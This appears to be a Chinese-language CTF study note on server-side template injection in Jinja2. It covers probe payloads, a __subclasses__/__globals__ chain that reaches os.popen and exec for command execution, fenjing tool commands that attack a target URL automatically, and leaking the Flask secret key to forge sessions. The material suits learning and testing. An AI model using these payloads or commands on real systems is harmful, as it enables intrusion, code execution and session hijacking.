# SSTI

SSTI（Server-Side Template Injection）是指攻击者通过在服务器端模板中注入恶意代码，从而执行任意代码或泄露敏感信息的攻击方式。攻击者利用模板引擎的功能，将恶意代码嵌入到模板中，当服务器渲染模板时，恶意代码被执行，导致安全漏洞。

## 模板引擎

模板引擎是一种用于生成动态内容的工具，常用于Web开发中。它允许开发者在HTML中嵌入代码，以便动态生成页面内容。常见的模板引擎有Jinja2（Python）、Thymeleaf（Java）、Handlebars（JavaScript）等。

例如在常见的Python Web框架中：

- Flask，FastAPI使用Jinja2作为默认的模板引擎，攻击者可以通过在模板中注入恶意代码来执行任意命令或访问敏感数据。
- Django使用Django Template Language（DTL）作为默认的模板引擎，攻击者可以通过在模板中注入恶意代码来执行任意命令或访问敏感数据。

模板引擎的功能强大，但如果没有正确地处理用户输入，可能会导致SSTI漏洞。因此，在开发过程中，必须确保对用户输入进行适当的过滤和验证，以防止恶意代码的注入和执行。

除此以外还有其他的模板引擎

- Velocity（Java）
- FreeMarker（Java）
- Twig（PHP）
- Smarty（PHP）

## Jinja2

在Jinja2中，可以利用如下的方式插入表达式

```html
7*7 = {{ 7*7 }}
```

当服务器渲染这个模板时，表达式 `{{ 7*7 }}` 会被计算并输出结果 `49`。攻击者可以利用这种方式注入恶意代码，例如：

```html
7*7 = {{ config.items() }}
```

当服务器渲染这个模板时，表达式 `{{ config.items() }}` 会被计算并输出服务器的配置信息，可能包含敏感数据。因此，在使用模板引擎时，必须确保对用户输入进行适当的过滤和验证，以防止SSTI漏洞的发生。

然而一般的题目中，会对输入进行过滤，使得无法直接通过最简单表达式实现代码执行，于是将整个过程转化成了类似 **Python Jail** 的形式，攻击者需要通过构造复杂的表达式来绕过过滤器，从而实现代码执行。这种攻击方式需要攻击者对模板引擎的内部机制有较深入的了解，并且能够巧妙地构造表达式来达到攻击目的。

## Python Jail Bypass

### Python Objects

在Python中，几乎所有的东西都是对象，包括函数、类、模块等。这些对象都有一些特殊的属性例如：

- `__class__`，它指向对象所属的类。通过访问这个属性，攻击者可以获取到对象的类型信息，从而进一步利用这些信息来构造攻击载荷
- `__mro__`，它是一个元组，包含了类的继承关系。通过访问这个属性，攻击者可以获取到类的继承关系，从而进一步利用这些信息来构造攻击载荷
- `__base__`，它指向类的基类。通过访问这个属性，攻击者可以获取到类的基类信息，从而进一步利用这些信息来构造攻击载荷
- `__subclasses__`，它是一个列表，包含了类的所有子类。通过访问这个属性，攻击者可以获取到类的所有子类，从而进一步利用这些信息来构造攻击载荷
- `__globals__`，它是一个字典，包含了函数的全局变量。通过访问这个属性，攻击者可以获取到函数的全局变量，从而进一步利用这些信息来构造攻击载荷

一般类似于通过 `''.__class__.__base__.__subclasses__()[xx]` 找到例如 `subprocess.Popen` 这样的全局导入了目标模块 `os` 的类，然后可以导入模块并执行命令 `''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['os'].popen('...').read()`

或者直接从全局函数中调用 `exec` 等 `''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['exec']('...')`

## fenjing

利用 fenjing 可以直接一把梭，绕过所有的过滤器，直接执行任意代码。

https://github.com/Marven11/FenJing

使用方法：

**scan**

在终端可以用scan功能，猜测某个页面的参数并自动攻击：

`python -m fenjing scan --url 'http://xxxx:xxx/yyy'`

**crack**

也可以用crack功能，手动指定参数进行攻击：

`python -m fenjing crack --url 'http://xxxx:xxx/yyy' --detect-mode fast --inputs aaa,bbb --method GET`

这里提供了aaa和bbb两个参数进行攻击，并使用 `--detect-mode fast`加速攻击速度

**crack-request**

还可以将HTTP请求写进一个文本文件里（比如说 `req.txt`）然后进行攻击

文本文件内容如下：

```httpspec
GET /?name=PAYLOAD HTTP/1.1
Host: 127.0.0.1:5000
Connection: close
```

命令如下：

`python -m fenjing crack-request -f req.txt --host '127.0.0.1' --port 5000`

**crack-keywords**

如果已经拿到了服务端源码 `app.py`的话，可以自动提取代码中的列表作为黑名单生成对应的payload

命令如下：

`python -m fenjing crack-keywords -k app.py -c 'ls /'`

## 其他

SSTI 不只是 RCE，还可以 拿到 Flask Secret Key，例如

```html
{{ config.SECRET_KEY }}
```

如果模板允许访问 config 对象，就能伪造 session。典型链条：

SSTI → 泄露 SECRET_KEY → session 劫持 → admin 权限
